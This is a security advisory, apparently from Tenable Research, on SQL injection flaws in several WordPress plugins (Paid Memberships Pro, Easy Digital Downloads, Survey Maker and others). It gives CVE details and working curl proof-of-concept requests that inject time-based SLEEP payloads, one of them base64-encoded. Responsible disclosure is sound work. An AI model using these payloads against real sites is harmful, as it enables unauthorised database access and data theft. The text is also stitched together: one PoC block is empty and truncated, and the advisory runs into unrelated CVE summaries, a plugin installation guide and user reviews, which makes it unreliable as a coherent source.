# SQL Injection in Multiple WordPress Plugins

Critical

[← View More Research Advisories](/security/research)
### Synopsis

Joshua Martinelle of Tenable Research discovered multiple SQL Injection vulnerabilities across a number of WordPress plugins. This advisory will track each vulnerability as information and fixes become available.

---

**Paid Memberships Pro : CVE-2023-23488 - Unauthenticated SQL Injection**

**Reference:** https://wordpress.org/plugins/paid-memberships-pro

**Affected Versions:** < 2.9.8

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 9.8

The plugin does not escape the 'code' parameter in the /pmpro/v1/order REST route before using it in a SQL statement, leading to an unauthenticated SQL injection vulnerability.

**Proof of Concept:**

Where TARGET\_HOST is the address of the wordpress host with Paid Memberships Pro installed, the following proof of concept uses the SLEEP function to demonstrate the SQL injection. Changing the value passed to sleep will alter how long the request takes to return.

```

curl "http://TARGET_HOST/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)--%20-"
```

For example, running this twice with the "time" command will show the difference in response times:

```

time curl "http://TARGET_HOST/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(1)))a)--%20-"
{}
real    0m3.068s
user    0m0.006s
sys    0m0.009s

time curl "http://TARGET_HOST/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)--%20-"
{}
real    0m6.095s
user    0m0.006s
sys    0m0.009s
```

**Easy Digital Downloads: CVE-2023-23489 - Unauthenticated SQL Injection

Reference:** https://wordpress.org/plugins/easy-digital-downloads/

**Affected Versions:**3.1.0.2 & 3.1.0.3

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 9.8

The plugin does not escape the 's' parameter in the 'edd\_download\_search' action before using it in a SQL statement, leading to an unauthenticated SQL injection vulnerability.

The vulnerable part of the code corresponds to the 'edd\_ajax\_download\_search()' function of the './includes/ajax-functions.php' file.

**Proof of Concept:**

Where TARGET\_HOST is the address of the wordpress host with Paid Memberships Pro installed, the following proof of concept uses the SLEEP function to demonstrate the SQL injection. Changing the value passed to sleep will alter how long the request takes to return.

*Note:* The same SQL injection/unique request will not work twice in a row right away, as the 'edd\_ajax\_download\_search()' function stores the most recent search for 30 seconds (so to run the same payload again, you will have to modify the payload slightly or wait 30 seconds).

```

curl "http://TARGET_HOST/wp-admin/admin-ajax.php?action=edd_download_search&s=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)--+-"

```

**Survey Maker: CVE-2023-23490 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/survey-maker

**Affected Versions:** < 3.1.2

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the ‘surveys\_ids’ parameter in the 'ays\_surveys\_export\_json' action before using it in a SQL statement, leading to an authenticated SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=ays_surveys_export_json&surveys_ids[0]=1)+AND+(SELECT+1+FROM+(SELECT(SLEEP(3)))a)--+-"

```

**ReviewX: CVE-2023-26325 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/reviewx/

**Affected Versions:** <= 1.6.6

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the 'filterValue' or 'selectedColumns' parameters in the rx\_export\_review action before using them in a SQL statement, leading to a SQL injection.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=rx_export_review&filterValue[0]=&filterValue[1]=&filterValue[2]=&filterValue[3]=&filterValue[4]=all&filterValue[5]=&filterValue[6]=aaaa&filterValue[7]=id+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)&filterValue[8]=desc&selectedColumns[0]=id"
```

**Waiting: One-click Countdowns: CVE-2023-28659 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/waiting/

**Affected Versions:** <= 0.6.2

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The **pbc\_down[meta][id]** parameter of the **pbc\_save\_downs** action is vulnerable to SQL injection.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=pbc_save_downs&pbc_down[meta][id]=1+OR+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)--"
```

**Events Made Easy: CVE-2023-28660 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/events-made-easy/

**Affected Versions:** <= 2.3.14

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the '**search\_name**' parameter in the **eme\_recurrences\_list** action before using it in a SQL statement, leading to a SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php?action=eme_recurrences_list&search_name=1'{+}AND{+}(SELECT+1+FROM+(SELECT(SLEEP(0.5)))a)-{-}+{-}" --header "$WP_COOKIE"
```

**WP Popup Banners: CVE-2023-28661 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/wp-popup-banners/

**Affected Versions:** <= 1.2.5

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the '**value**' parameter in the **get\_popup\_data** action before using it in a SQL statement, leading to a SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

**Gift Cards (Gift Vouchers and Packages): CVE-2023-28662 - Unauthenticated SQL Injection

Reference:**https://wordpress.org/plugins/gift-voucher/

**Affected Versions:** <= 4.3.1

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 9.8

The plugin does not escape the ‘**template**’ parameter in the **wpgv\_doajax\_voucher\_pdf\_save\_func** action before using it in a SQL statement, leading to a SQL injection vulnerability.

The vulnerability does not require authentication to trigger.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user, and where $BASE64\_INJECTION is the base64 encoded SQL injection, for example:

**LTEgT1IgU0xFRVAoMik=** translates to **-1 OR SLEEP(2)**

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --data "action=wpgv_doajax_voucher_pdf_save_func&template=$BASE64_INJECTION"
```

or with a proper payload:

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --data "action=wpgv_doajax_voucher_pdf_save_func&template=LTEgT1IgU0xFRVAoMik="

```

**Formidable PRO2PDF: CVE-2023-28663 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/formidablepro-2-pdf/

**Affected Versions:** < 3.11

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the ‘**fieldmap**’ parameter in the **fpropdf\_export\_file** action before using it in a SQL statement, leading to a SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=fpropdf_export_file&fieldmap=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)"
```

  ###### medium

  GitHub Desktop is an open-source Electron-based GitHub app designed for git development. An attacker convincing a user to clone a repository directly or through a submodule can allow the attacker access to the user's credentials through the use of maliciously crafted remote URL. GitHub Desktop relies on Git to perform all network related operations (such as cloning, fetching, and pushing). When a user attempts to clone a repository GitHub Desktop will invoke `git clone` and when Git encounters a remote which requires authentication it will request the credentials for that remote host from GitHub Desktop using the git-credential protocol. Using a maliciously crafted URL it's possible to cause the credential request coming from Git to be misinterpreted by Github Desktop such that it will send credentials for a different host than the host that Git is currently communicating with thereby allowing for secret exfiltration. GitHub username and OAuth token, or credentials for other Git remote hosts stored in GitHub Desktop could be improperly transmitted to an unrelated host. Users should update to GitHub Desktop 3.4.12 or greater which fixes this vulnerability. Users who suspect they may be affected should revoke any relevant credentials.
* ##### [CVE-2025-0502](https://www.tenable.com/cve/CVE-2025-0502)

  ###### medium

  Transmission of Private Resources into a New Sphere ('Resource Leak') vulnerability in CrafterCMS Engine on Linux, MacOS, x86, Windows, 64 bit, ARM allows Directory Indexing, Resource Leak Exposure.This issue affects CrafterCMS: from 4.0.0 before 4.0.8, from 4.1.0 before 4.1.6.

  ###### medium

  A vulnerability classified as problematic has been found in wuzhicms 4.1.0. This affects the function test of the file coreframe/app/search/admin/config.php. The manipulation of the argument sphinxhost/sphinxport leads to server-side request forgery. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.
* ##### [CVE-2024-52005](https://www.tenable.com/cve/CVE-2024-52005)

  ###### high

  Git is a source code management tool. When cloning from a server (or fetching, or pushing), informational or error messages are transported from the remote Git process to the client via the so-called "sideband channel". These messages will be prefixed with "remote:" and printed directly to the standard error output. Typically, this standard error output is connected to a terminal that understands ANSI escape sequences, which Git did not protect against. Most modern terminals support control sequences that can be used by a malicious actor to hide and misrepresent information, or to mislead the user into executing untrusted scripts. As requested on the git-security mailing list, the patches are under discussion on the public mailing list. Users are advised to update as soon as possible. Users unable to upgrade should avoid recursive clones unless they are from trusted sources.

## Installation

This section describes how to install the plugin and get it working.

#### From your WordPress dashboard

1. Visit ‘Plugins → Add New’
2. Search for ‘Formidable PRO2PDF’
3. Activate Formidable PRO2PDF from your Plugins page.

#### From WordPress.org

1. Download FormidablePRO2PDF.
2. Upload the ‘formidablepro-2-pdf’ directory to your `/wp-content/plugins/` directory, using your favorite method (ftp, sftp, scp, etc…)
3. Activate Formidable PRO2PDF from your Plugins page.

#### Once Activated

1. Make sure that you have at least one Formidable form, **and at least one form entry** in the form you want to merge into a pdf.
2. Choose “New Field Map” in “Field Map to use”.
3. Click “Upload a PDF file” in “Field Map Designer” section.

5. Add field mappings to your PDF file in “Manage your custom layout here” section.

#### Demo Installation Video

NOTE: The plugin uses [PDFTK](https://www.pdflabs.com/docs/pdftk-man-page/) to fill in PDF files. This means that your server has to have PHP shell commands enabled. If your server does not have `pdftk` installed, you can still use the plugin to generate 1 PDF file for 1 Formidable form.

If you [purchase](http://formidablepro2pdf.com/) the plugin using [our website](http://formidablepro2pdf.com/), you do not need to install `pdftk` or to enable shell commands on your server. You’ll use our API according to the [Terms of Service](http://formidablepro2pdf.com/terms-of-service/).

Enter the activation code on the plugin options page.

## FAQ

### What are the requirements?

[Formidable Forms plugin](http://www.formidablepro.com), make sure that your server can execute shell commands, and that `pdftk` is installed on your server.

You’ll also need to have PHP `MB` or `iconv` extensions installed. They are usually installed on web servers.

If you purchase the plugin, no additional software installation is need.

PHP version should be at least 5.3.

### Does the plugin create PDF files?

Not at this time. Currently the plugin populates pre-made PDF form fields with mapped data from Formidable Form and FormidablePro form fields.

Future plans include adding HTML to PDF capabilities.

### Is support offered for the free version?

Yes – standard user support is available through the support forum or purchase a key code for premium level support.

### Does the plugin work with multisite installations?

Yes, the plugin works with WordPress Multisite. Site limits still apply.

We started off using Formidable forms and bought PRO2PDF as a plugin for extra features.
Worked like a charm and ran into a slight configuration problem.
Email support with our challenge and requests and literally within one minute we not only received feedback but a support technician logged in. Fixed the issue, and assisted with the features configuration we requested.
Registered on Wordpress.org just to leave the review.
Could not believe the support we just received.
Buy and support this platform.

This is the worst plugin. I have watched the demo. I have created the pdf. Now all i have to get it to the website. It has been a complete nightmare It is very unclear where the support form. I have spent 3 days trying to get my contract and a signature in my webpage. I have paid for this service and feel entirely frustrated.

I don’t understand where all the 5 stars are coming from.
This product is difficult to configure and use. I watched the demo videos, read the documentation for the PRO version, which we purchased.
In trying to import the PDF file from Adobe acrobat DC, the import fails, but does not provide a specific reason for the failure. We tried even a form with only one field import with no success.
The support website’s menus circle back on themselves with no detail on items being searched for.
The product has potential because it works with Formidable Pro, which is an excellent product. I now have 5 hours invested in getting the first form to work and no success.
I am revising my review because for $5.00 they fixed all the issues I was having with the product. I would have paid $50.00 for that level of service.
Their website still needs some work or a “heads-up” notice that it’s much easier to pay to have the forms created for you.

Purchased the Pro version, spent a lot of time creating a form in wordpress using Formidable and a PDF using Adobe Acrobat Pro, and there isn’t any dataset to export. Can’t match form data to pdf without data to export. Very disappointed with the poor documentation!
Although the form and PDF are nearly identical there are some fields that do not match with uploaded pdf.
I submitted an email for support.

We have been using this plugin for a couple of years now. We have had two issues in the time span and in both cases the support was exceptional. There is a fast response on the forums and the developer even gave us his Skype info so we could make immediate contact if necessary. You don’t see that very often. The plugin works well with even the most complicated of forms. I would highly recommend this solution.
